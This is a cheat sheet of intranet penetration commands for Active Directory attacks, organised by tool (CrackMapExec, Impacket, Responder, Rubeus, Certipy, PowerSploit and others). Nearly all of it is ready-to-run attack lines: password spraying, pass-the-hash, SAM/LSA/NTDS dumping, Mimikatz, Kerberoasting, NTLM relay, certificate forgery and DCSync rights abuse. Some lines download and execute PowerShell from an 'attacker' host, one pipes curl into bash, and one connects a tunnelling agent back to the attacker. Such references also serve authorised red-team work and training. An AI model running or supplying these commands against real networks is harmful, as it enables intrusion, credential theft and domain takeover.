# Intranet Penetration

_19 tool commands_

### CrackMapExec  `crackmapexec`
_Swiss Army knife for intranet penetration_

**Step 0**
> Scan for SMB services within a subnet
_platform: linux_
```
crackmapexec smb 192.168.1.0/24
```
**Syntax breakdown:**
- `crackmapexec` — CME tool _command_
- `smb` — SMB protocol module _value_

**Step 0**
> Test multiple users with a single password
_platform: linux_
```
crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123
```
**Syntax breakdown:**
- `-u` — Username or user file _parameter_
- `-p` — Password or password file _parameter_

**Step 0**
> Test whether credentials are valid
_platform: linux_
```
crackmapexec smb 192.168.1.0/24 -u admin -p password
```

**Step 0**
> Authenticate using a hash
_platform: linux_
```
crackmapexec smb 192.168.1.0/24 -u admin -H NTHASH
```
**Syntax breakdown:**
- `-H` — NTLM hash _parameter_

**Step 0**
> Execute a command on the target machine
_platform: linux_
```
crackmapexec smb 192.168.1.100 -u admin -p password -x "whoami"
```
**Syntax breakdown:**
- `-x` — Execute a command _parameter_

**Step 0**
> Execute PowerShell on the target machine
_platform: linux_
```
crackmapexec smb 192.168.1.100 -u admin -p password -X "Get-Process"
```
**Syntax breakdown:**
- `-X` — Execute a PowerShell command _parameter_

**Step 0**
> Dump the SAM database
_platform: linux_
```
crackmapexec smb 192.168.1.100 -u admin -p password --sam
```

**Step 0**
> Dump LSASS credentials
_platform: linux_
```
crackmapexec smb 192.168.1.100 -u admin -p password --lsa
```

**Step 0**
> Run the Mimikatz module
_platform: linux_
```
crackmapexec smb 192.168.1.100 -u admin -p password -M mimikatz
```
**Syntax breakdown:**
- `-M` — Specify a module _parameter_

**Step 0**
> Execute commands via WinRM
_platform: linux_
```
crackmapexec winrm 192.168.1.100 -u admin -p password
```

---

### Impacket  `impacket`
_Python network protocol library_

**Step 0**
> PsExec remote execution
_platform: linux_
```
psexec.py domain/user:password@target_ip
```

**Step 0**
> WMI remote execution
_platform: linux_
```
wmiexec.py domain/user:password@target_ip
```

**Step 0**
> Execute via a scheduled task
_platform: linux_
```
atexec.py domain/user:password@target_ip "command"
```

**Step 0**
> SMB remote execution
_platform: linux_
```
smbexec.py domain/user:password@target_ip
```

**Step 0**
> Dump all credentials
_platform: linux_
```
secretsdump.py domain/user:password@target_ip
```

**Step 0**
> Kerberoasting attack
_platform: linux_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip -request
```

**Step 0**
> AS-REP Roasting attack
_platform: linux_
```
GetNPUsers.py domain/ -usersfile users.txt -format hashcat
```

**Step 0**
> NTLM relay attack
_platform: linux_
```
ntlmrelayx.py -tf targets.txt -smb2support
```

**Step 0**
> MSSQL client
_platform: linux_
```
mssqlclient.py domain/user:password@target_ip
```

**Step 0**
> Enumerate users via LSA
_platform: linux_
```
lookupsid.py domain/user:password@target_ip
```

---

### Responder  `responder`
_LLMNR/NBT-NS/MDNS Poisoner_

**Step 0**
> Start Responder listening
_platform: linux_
```
responder -I eth0
```

**Step 0**
> Passive analysis mode
_platform: linux_
```
responder -I eth0 -A
```

**Step 0**
> Enable WPAD proxy attack
_platform: linux_
```
responder -I eth0 -wF
```

**Step 0**
> Enable the Finger service
_platform: linux_
```
responder -I eth0 -f
```

**Step 0**
> Disable the SMB service
_platform: linux_
```
responder -I eth0 --disable-smb
```

**Step 0**
> View captured hashes
_platform: linux_
```
cat /usr/share/responder/logs/*.txt
```

**Step 0**
> Enable DHCP spoofing
_platform: linux_
```
responder -I eth0 -D
```

---

### Evil-WinRM  `evil-winrm`
_WinRM remote management tool_

**Step 0**
> Connect using a password
_platform: linux_
```
evil-winrm -i target_ip -u user -p password
```

**Step 0**
> Connect using a hash
_platform: linux_
```
evil-winrm -i target_ip -u user -H ntlm_hash
```

**Step 0**
> Upload a file to the target
_platform: linux_
```
upload local_file remote_path
```

**Step 0**
> Download a file from the target
_platform: linux_
```
download remote_path local_file
```

**Step 0**
> Load a PowerShell script
_platform: linux_
```
menu
Bypass-4MSI
Invoke-Mimikatz
```

**Step 0**
> Execute a PowerShell command
_platform: linux_
```
Invoke-Command -ScriptBlock {whoami}
```

---

### ProxyChains  `proxychains`
_Proxy chaining tool_

**Step 0**
> Configure a SOCKS proxy
_platform: linux_
```
vim /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```

**Step 0**
> Run a tool through the proxy
_platform: linux_
```
proxychains4 nmap -sT -Pn target_ip
```

**Step 0**
> Dynamic proxy chain
_platform: linux_
```
dynamic_chain
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

**Step 0**
> Use proxies strictly in order
_platform: linux_
```
strict_chain
```

**Step 0**
> Randomly select proxies
_platform: linux_
```
random_chain
```

---

### BloodHound  `bloodhound-tool`
_Active Directory relationship analysis tool_

**Step 0**
> Start the Neo4j database
_platform: linux_
```
sudo neo4j console
```

**Step 0**
> Launch the BloodHound interface
_platform: linux_
```
bloodhound
```

**Step 0**
> Collect all domain information
_platform: windows_
```
SharpHound.exe -c All
```

**Step 0**
> Remotely load and collect via PowerShell
_platform: windows_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All
```

**Step 0**
> Python version collection
_platform: linux_
```
bloodhound-python -u user -p password -d domain.com -ns dc_ip
```

**Step 0**
> Query the shortest path to Domain Admin
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**Step 0**
> Query DCSync permission relationships
```
MATCH (n)-[r:DCSync]->(m) RETURN n,m
```

**Step 0**
> Query computers with unconstrained delegation
```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

**Step 0**
> Query high-privilege users
```
MATCH (n:User) WHERE n.admincount=true RETURN n
```

---

### SharpHound  `sharphound-tool`
_BloodHound data collector_

**Step 0**
> Collect all data
_platform: windows_
```
SharpHound.exe -c All
```

**Step 0**
> Specify the domain controller
_platform: windows_
```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.domain.com
```

**Step 0**
> Specify the domain name
_platform: windows_
```
SharpHound.exe -c All --Domain domain.com
```

**Step 0**
> Stealthy collection with randomized filenames
_platform: windows_
```
SharpHound.exe -c All --RandomizeFilenames --OutputDirectory C:\Users\Public
```

**Step 0**
> Specify collection methods
_platform: windows_
```
SharpHound.exe -c Default,ACL,Trusts,Container
```

---

### SharpSMBClient  `sharpsmbclient-tool`
_SMB client tool_

**Step 0**
> List SMB shares
_platform: windows_
```
SharpSMBClient.exe -d domain -u user -p password -i target_ip -L
```

**Step 0**
> List share directory contents
_platform: windows_
```
SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -l
```

**Step 0**
> Download a file
_platform: windows_
```
SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -g "path\file"
```

**Step 0**
> Upload a file
_platform: windows_
```
SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -p local_file -r remote_path
```

---

### PowerSploit  `powersploit-tool`
_PowerShell penetration testing framework_

**Step 0**
> Remotely load PowerView
_platform: windows_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1")
```

**Step 0**
> Get domain information
_platform: windows_
```
Get-NetDomain
```

**Step 0**
> Get domain users
_platform: windows_
```
Get-NetUser
```

**Step 0**
> Get domain administrators
_platform: windows_
```
Get-NetGroup "Domain Admins"
```

**Step 0**
> Get domain controllers
_platform: windows_
```
Get-NetDomainController
```

**Step 0**
> Find where domain administrators are logged in
_platform: windows_
```
Find-DomainUserLocation
```

**Step 0**
> Get an object's ACL
_platform: windows_
```
Get-ObjectAcl -SamAccountName target
```

**Step 0**
> Add DCSync privileges
_platform: windows_
```
Add-DomainObjectAcl -TargetIdentity target -Rights DCSync
```

---

### NetExec  `netexec`
_Successor to CrackMapExec, a network penetration testing automation tool_

**Step 0**
> SMB share and user enumeration
```
nxc smb 10.0.0.0/24 -u user -p password --shares
nxc smb 10.0.0.0/24 -u user -p password --users
```
**Syntax breakdown:**
- `nxc` — NetExec command-line tool _command_
- `smb` — Specify the SMB protocol _parameter_
- `--shares` — Enumerate share directories _parameter_

**Step 0**
> Spray multiple users with a single password
```
nxc smb 10.0.0.0/24 -u users.txt -p "Password123!" --continue-on-success
```

**Step 0**
> Execute commands via SMB/WinRM
```
nxc smb target_ip -u admin -p password -x "whoami"
nxc winrm target_ip -u admin -p password -X "Get-Process"
```

**Step 0**
> Extract credentials from SAM/LSA/NTDS
```
nxc smb target_ip -u admin -p password --sam
nxc smb target_ip -u admin -p password --lsa
nxc smb target_ip -u admin -p password --ntds
```

---

### Ligolo-ng  `ligolo-ng`
_Advanced intranet tunneling proxy tool based on a TUN interface_

**Step 0**
> Configure the TUN interface and start the proxy on the attacker machine
_platform: linux_
```
# Create the TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start the proxy service
./proxy -selfcert -laddr 0.0.0.0:11601
```
**Syntax breakdown:**
- `ip tuntap add` — Create a TUN virtual network interface _command_
- `-selfcert` — Use a self-signed certificate _parameter_

**Step 0**
> Run the agent on the target machine to connect back to the attacker machine
```
./agent -connect attacker_ip:11601 -ignore-cert
```

**Step 0**
> Configure routing for direct intranet access
_platform: linux_
```
# In the Ligolo console:
session
start
# Add a route on the attacker machine:
sudo ip route add 10.10.10.0/24 dev ligolo
```

---

### SharpHound  `sharphound`
_BloodHound's C# data collector, gathers AD information within a Windows domain_

**Step 0**
> Collect all AD domain information (users/groups/ACLs/sessions, etc.)
_platform: windows_
```
.\SharpHound.exe -c All
```
**Syntax breakdown:**
- `-c All` — Collect all types of data _parameter_

**Step 0**
> Collect from DC only, without saving cache, with randomized filenames
_platform: windows_
```
.\SharpHound.exe -c DCOnly --NoSaveCache --RandomFilenames --MemCache
```

**Step 0**
> Loop-collect session information (2 hours, every 5 minutes)
_platform: windows_
```
.\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00
```

**Step 0**
> Collect information for a specified subdomain
_platform: windows_
```
.\SharpHound.exe -c All -d child.domain.com --LdapUsername user --LdapPassword pass
```

---

### BloodHound-Python  `bloodhound-python`
_BloodHound's Python data collector, can remotely gather AD information from Linux_

**Step 0**
> Remotely collect full AD domain information from Linux
_platform: linux_
```
bloodhound-python -d domain.com -u user -p password -ns dc_ip -c All
```
**Syntax breakdown:**
- `-d` — Target domain name _parameter_
- `-ns` — DNS server (usually the DC) _parameter_
- `-c All` — Collect all types of data _parameter_

**Step 0**
> Use an NTLM hash for Pass-the-Hash collection
_platform: linux_
```
bloodhound-python -d domain.com -u user --hashes aad3b435b51404eeaad3b435b51404ee:ntlm_hash -ns dc_ip -c All
```

**Step 0**
> Collect only group, local administrator, and session information
_platform: linux_
```
bloodhound-python -d domain.com -u user -p pass -ns dc_ip -c Group,LocalAdmin,Session
```

---

### Rubeus  `rubeus`
_Kerberos attack toolkit for ticket manipulation and Kerberos attacks_

**Step 0**
> Request service tickets for offline cracking
_platform: windows_
```
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt
```
**Syntax breakdown:**
- `kerberoast` — Request TGS tickets for offline cracking _command_
- `/outfile` — Save hashes to a file _parameter_

**Step 0**
> Request AS-REP for accounts that do not require pre-authentication
_platform: windows_
```
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

**Step 0**
> Import Kerberos tickets
_platform: windows_
```
Rubeus.exe ptt /ticket:base64_ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

**Step 0**
> Request a TGT ticket using a password or hash
_platform: windows_
```
Rubeus.exe asktgt /user:user /password:pass /enctype:aes256 /ptt
Rubeus.exe asktgt /user:user /rc4:ntlm_hash /ptt
```

**Step 0**
> S4U constrained delegation attack
_platform: windows_
```
Rubeus.exe s4u /user:svc$ /rc4:hash /impersonateuser:admin /msdsspn:cifs/target /ptt
```

---

### Certipy  `certipy`
_AD CS (Active Directory Certificate Services) attack tool_

**Step 0**
> Enumerate exploitable certificate templates
```
certipy find -u user@domain.com -p password -dc-ip dc_ip -enabled -vulnerable
```
**Syntax breakdown:**
- `find` — Enumeration mode _command_
- `-vulnerable` — Show only exploitable templates _parameter_

**Step 0**
> ESC1: exploit a template that allows SAN to forge an administrator certificate
```
certipy req -u user@domain.com -p password -ca CA-NAME -template VULN_TEMPLATE -upn admin@domain.com
```

**Step 0**
> Use a certificate for PKINIT authentication to obtain the NT hash
```
certipy auth -pfx admin.pfx -dc-ip dc_ip
```

**Step 0**
> Shadow Credentials attack to obtain a target user's credentials
```
certipy shadow auto -u user@domain.com -p password -account target_user
```

---

### LaZagne  `lazagne-tool`
_Automated local password recovery tool supporting dozens of applications_

**Step 0**
> Extract passwords from all supported applications
_platform: windows_
```
lazagne.exe all
```
**Syntax breakdown:**
- `all` — Search all supported applications _parameter_

**Step 0**
> Extract passwords from only specified categories
_platform: windows_
```
lazagne.exe browsers
lazagne.exe wifi
lazagne.exe databases
lazagne.exe sysadmin
```

**Step 0**
> Linux version usage
_platform: linux_
```
python3 lazagne.py all
python3 lazagne.py browsers
```

---

### Seatbelt  `seatbelt`
_C# security auditing tool that quickly gathers security-related information from a Windows system_

**Step 0**
> Run all security checks
_platform: windows_
```
Seatbelt.exe -group=all -full
```
**Syntax breakdown:**
- `-group=all` — Run all check groups _parameter_
- `-full` — Verbose output mode _parameter_

**Step 0**
> Check system- and user-related security configurations
_platform: windows_
```
Seatbelt.exe -group=system -group=user
```

**Step 0**
> Run specified check modules
_platform: windows_
```
Seatbelt.exe CredEnum WindowsVault SavedRDPConnections RecentFiles
```

**Step 0**
> Remotely perform a security audit
_platform: windows_
```
Seatbelt.exe -group=remote -computername=target -username=admin -password=pass
```

---

### WinPEAS  `winpeas`
_Windows privilege escalation helper script that automatically discovers escalation paths_

**Step 0**
> Run all Windows privilege escalation checks
_platform: windows_
```
winpeasany.exe
```

**Step 0**
> Fast mode (skip time-consuming checks)
_platform: windows_
```
winpeasany.exe fast
```

**Step 0**
> Check only specified categories
_platform: windows_
```
winpeasany.exe servicesinfo
winpeasany.exe userinfo
winpeasany.exe systeminfo
```

**Step 0**
> Save results to a file
_platform: windows_
```
winpeasany.exe log=output.txt
winpeasany.exe /quiet > output.txt 2>&1
```

---

### LinPEAS  `linpeas`
_Linux privilege escalation helper script that automatically discovers escalation paths_

**Step 0**
> Run all Linux privilege escalation checks
_platform: linux_
```
./linpeas.sh
```

**Step 0**
> Comprehensive scan (including time-consuming checks) with output to a file
_platform: linux_
```
./linpeas.sh -a -o output.txt
```

**Step 0**
> Fileless direct execution
_platform: linux_
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

**Step 0**
> Specify check categories
_platform: linux_
```
./linpeas.sh -s
# -s: superfast checks only
# -P: password-related only
# -n: network information only
```

---
